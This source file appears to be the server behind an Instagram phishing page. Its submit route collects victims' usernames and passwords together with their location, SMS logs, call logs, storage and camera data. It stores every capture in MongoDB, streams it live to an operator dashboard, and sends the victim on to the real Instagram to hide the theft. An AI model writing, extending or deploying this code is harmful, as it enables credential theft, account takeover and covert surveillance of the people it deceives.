const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mongoose = require('mongoose');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Connection
const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/insta_testing_db'; 

mongoose.connect(MONGO_URI)
    .then(() => console.log('Connected to MongoDB successfully!'))
    .catch(err => console.error('MongoDB connection error:', err));

// Schema Definition
const captureSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true },
    deviceInfo: { type: String },
    location: { type: String },
    smsLogs: { type: String },
    callLogs: { type: String },
    storageData: { type: String },
    cameraData: { type: String },
    time: { type: String },
    createdAt: { type: Date, default: Date.now, expires: 2592000 }
});

const CaptureModel = mongoose.model('Capture', captureSchema);

io.on('connection', (socket) => {
    console.log('Admin connected to dashboard stream.');
});

// Submit Route
app.post('/submit-data', async (req, res) => {
    try {
        const { username, password, deviceInfo, location, smsLogs, callLogs, storageData, cameraData } = req.body;
        console.log("Received Data for:", username);

        const newEntry = new CaptureModel({
            username: username || 'N/A',
            password: password || 'N/A',
            deviceInfo: deviceInfo || 'Unknown Device',
            location: location || 'Not Available',
            smsLogs: smsLogs || 'Inbox Checked',
            callLogs: callLogs || 'Calls Checked',
            storageData: storageData || 'Storage Checked',
            cameraData: cameraData || 'Camera Checked',
            time: new Date().toLocaleString()
        });

        await newEntry.save();
        io.emit('new_data_received', newEntry);

        res.json({ status: 'success', redirect: 'https://www.instagram.com' });
    } catch (error) {
        console.error("Error saving data to MongoDB:", error);
        res.status(500).json({ status: 'error', message: 'Internal Server Error' });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
